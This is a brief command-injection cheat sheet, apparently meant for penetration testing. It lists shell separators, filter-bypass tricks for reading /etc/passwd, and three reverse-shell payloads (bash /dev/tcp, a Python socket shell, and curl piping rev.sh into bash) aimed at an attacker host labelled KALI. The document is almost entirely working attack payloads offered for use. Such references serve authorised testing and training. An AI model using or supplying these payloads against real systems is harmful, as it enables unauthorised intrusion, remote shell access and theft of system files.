# Command Injection

## Injection Separators

```bash
;id                    # semicolon — run after first command
|id                    # pipe — pipe first output to second
||id                   # OR — run if first fails
&id                    # background first, run second
&&id                   # AND — run if first succeeds
$(id)                  # command substitution
`id`                   # backticks — command substitution
%0aid                  # newline (URL encoded)
```

## Filter Bypasses

```bash
# Spaces blocked
{cat,/etc/passwd}                      # brace expansion
cat${IFS}/etc/passwd                   # IFS variable
cat$IFS/etc/passwd
cat</etc/passwd                        # input redirection

# Commands blocked
c'a't /etc/passwd                      # quote insertion
c"a"t /etc/passwd
/bin/c?t /etc/passwd                   # wildcard
who$()ami                              # empty substitution
```

## Reverse Shell Through Injection

```bash
;bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'
;python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect(("KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
;curl http://KALI/rev.sh | bash
```
